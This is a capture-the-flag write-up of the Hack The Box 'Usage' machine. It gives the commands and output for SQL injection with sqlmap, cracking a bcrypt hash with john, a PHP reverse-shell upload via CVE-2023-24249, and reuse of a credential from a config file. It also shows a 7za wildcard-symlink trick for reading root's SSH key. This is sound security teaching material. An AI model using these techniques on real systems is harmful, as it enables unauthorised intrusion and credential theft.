![Usage](https://github.com/amalcew/htb-writeups/assets/73908014/9bba025a-588b-4b7c-b55d-20da0d9cf76c)

## Reconnaissance & port scanning

Let's start with port scanning and some enumeration:

```bash
# Nmap 7.94SVN scan initiated Mon Apr 15 16:56:39 2024 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.18
Nmap scan report for 10.10.11.18
Host is up, received syn-ack (0.083s latency).
Scanned at 2024-04-15 16:56:40 CEST for 12s
Not shown: 866 closed tcp ports (conn-refused), 132 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 15 16:56:52 2024 -- 1 IP address (1 host up) scanned in 12.95 seconds
```

```bash
> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://usage.htb/FUZZ -t 10

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://usage.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 5141, Words: 2184, Lines: 266, Duration: 865ms]
registration            [Status: 200, Size: 5112, Words: 2108, Lines: 265, Duration: 409ms]
logout                  [Status: 302, Size: 334, Words: 60, Lines: 12, Duration: 321ms]
dashboard               [Status: 302, Size: 334, Words: 60, Lines: 12, Duration: 6089ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Okay, so we got a webpage available at port 80 and ssh listening at standard port. The website welcomes with login prompt:

![01-login_page](https://github.com/amalcew/htb-writeups/assets/73908014/ca6e2d6c-99b2-4475-8545-fb3a09ca89b4)

Besides the registration page, there is also a admin login page:

![03-admin_login](https://github.com/amalcew/htb-writeups/assets/73908014/19d95ed2-bffb-4c76-992f-459d3c98031a)

Testing those login prompts did not return anything useful, so I created a account on the website and was exploring the page for a while.
Interestingly, when checking the password reset form, I've discovered some interesting behavior:

![02-password_reset](https://github.com/amalcew/htb-writeups/assets/73908014/c08f8ff5-b864-4971-8f2e-7704a6bc9a94)

when passing a `'` at the end of the email, the server crashed and returned error 500. This means, that the server somehow understands the input and tries to parse it. The `'` is a start of a string in SQL, which gives small nudge - the server is probably vulnerable to SQLi attacks.

## Initial foothold

### SQL injection

The process of gaining the initial foothold was very painful, as the server was spamming with 504 errors and refreshed cookies often. The way to force the server to leak database contents through SQL injection required using `sqlmap` with Burp Suite request, the process looked like this:

1. Register an account on 
2. After registration, head to password reset page and submit a request with valid email used during registration
3. Intercept a POST request w/ Burp and save it
4. run `sqlmap` using the saved request

This way I was able to iteratively explore the database, gaining more information about it and its contents. Finally, using the below query I've retrieved the admin password hash

```bash
> sqlmap -r resetpass.req -p 'email' --dbms=***** --level=5 --risk=3 --technique=BUT --batch -D ****** -T ****** --dump


        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.3#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:01:53 /2024-04-16/

[21:01:53] [INFO] parsing HTTP request from 'resetpass.req'
[21:01:53] [DEBUG] not a valid WebScarab log data
[21:01:53] [DEBUG] cleaning up configuration parameters
[21:01:53] [DEBUG] setting the HTTP timeout
[21:01:53] [DEBUG] setting the HTTP User-Agent header
[21:01:53] [DEBUG] creating HTTP requests opener object
[21:01:53] [DEBUG] forcing back-end DBMS to user defined value
[21:01:53] [DEBUG] provided parameter 'email' is not inside the Cookie
[21:01:53] [DEBUG] resolving hostname 'usage.htb'
[21:01:53] [INFO] testing connection to the target URL

... SNIP ...

[21:20:42] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
[21:20:42] [INFO] retrieved: admin
[21:20:42] [DEBUG] performed 34 queries in 21.80 seconds
[21:20:42] [DEBUG] analyzing table dump for possible password hashes
Database: *****
Table: *****
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y******************************************************rL2 | admin    | 2023-08-13 02:48:26 | 2024-04-16 19:14:16 | kT********************************************************LT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+

... SNIP ...
```

which can be cracked using `john`:

```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*********        (?)    
1g 0:00:00:05 DONE (2024-04-16 22:03) 0.1779g/s 288.2p/s 288.2c/s 288.2C/s maggie1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Using the password I've been able to log into the admin panel

![04-admin_panel](https://github.com/amalcew/htb-writeups/assets/73908014/92252b1e-08d1-4c2d-92ff-d154b586cb70)

### Arbitrary code execution

Next step on the checklist is to gain access to the server. Admin panel did not have many interesting inputs which could be used to upload reverse shell, as the only one promising was the avatar upload. I conducted research and found out, that this version of `laravel-admin` was vulnerable to [CVE-2023-24249](https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096), which allowed arbitrary code execution.
The [linked paper](https://flyd.uk/post/cve-2023-24249/) described the POC, which all I had to do is reproduce with correct payload. Using the modified [pentestmonkey's PHP reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell), I've started the process:

The vulnerable input is present at `User setting` page

![05-user_settings](https://github.com/amalcew/htb-writeups/assets/73908014/0fafa359-60ea-4bbc-8bb4-38e928609383)

Using Burp, I've intercepted the POST request of sample avatar and prepared the malicious request, changing the `filename`

![06-burp](https://github.com/amalcew/htb-writeups/assets/73908014/d8c47e7d-8954-4634-bcfb-ef295dd02453)

Refreshing the admin page, we can see that the payload was uploaded to the server:

![07-upload](https://github.com/amalcew/htb-writeups/assets/73908014/6f0e3528-f733-4c89-b403-34c58da03de0)

Now, listening on the selected port, we access the shell itself in the browser or in Burp, which spawns us the connection:

```bash
> nc -lvnp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.18] 49301
sh: 0: can't access tty; job control turned off
$ id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

User flag, as expected, is present in the home directory.

```bash
$ cat /home/dash/user.txt
f2****************************c8
```

## Lateral movement

On the machine there is another user called `xander`, which suggests that the lateral movement will be required.

```bash
dash@usage:~$ ls /home
dash  xander
```

After some time and enumeration, I've found out that there is enigmatic port `2812` open:

```bash
dash@usage:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1248/nginx: worker  
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      63836/monit         
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

When enumerating the filesystem looking for some related files, I've find out that the `dash` user has some interesting hidden files inside its home dir:

```bash
dash@usage:~$ find / -name '*monit*' 2>/dev/null
/var/lib/monit

... SNIP ...
/home/dash/.monitrc
/home/dash/.monit.state
/home/dash/.monit.id
/home/dash/.monit.pid
... SNIP ...
```

Apperantly, the `.monitrc` file contains some password:

```bash
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3**************d

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert

```

which allows to gain access over `xander` account:

```bash
dash@usage:~$ su - xander
Password: 

xander@usage:~$ id
uid=1001(xander) gid=1001(xander) groups=1001(xander)
```

## Root privileges escalation

`xander` has sudo privileges which can be leveraged to gain root access:

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

The `/usr/bin/usage_management` script is used to manage the project files and admin account:

```bash
xander@usage:~$ /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3):
```

Checking the content of the script using `strings` command reveals the tools that the scripts uses:

```bash
ander@usage:~$ strings /usr/bin/usage_management

... SNIP ...

/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql


... SNIP ...
```

This script utilizes the `7za` that can be exploited with technique named [**Wildcards Spare tricks**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----f1c2793eeb7e--------------------------------#id-7z)

The technique allows to read `root` flag by simply making the symbolic link to desired file inside archived folder and running the command using relative path instead of absolute. This way we can retrieve root private key:

```bash
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ sudo ../../../usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 55295802

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----
b3Bl******************************************************************=
***************************************BAgM=
-----END OPENSSH PRIVATE KEY-----


2984 folders, 19115 files, 114020153 bytes (109 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 22099

                                                                               
WARNING: No such file or directory
usage_blog/storage/framework/sessions/V9TCPxjwypWar5qxpEsKHdF0Kjf1QWALEGSIRHgq
```

Or even the root flag:


```bash
xander@usage:/var/www/html$ touch @root.txt
xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
xander@usage:/var/www/html$ sudo ../../../usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

... SNIP ...

Scan WARNINGS for files and folders:

d6****************************2a : No more files
----------------
Scan WARNINGS: 1

```
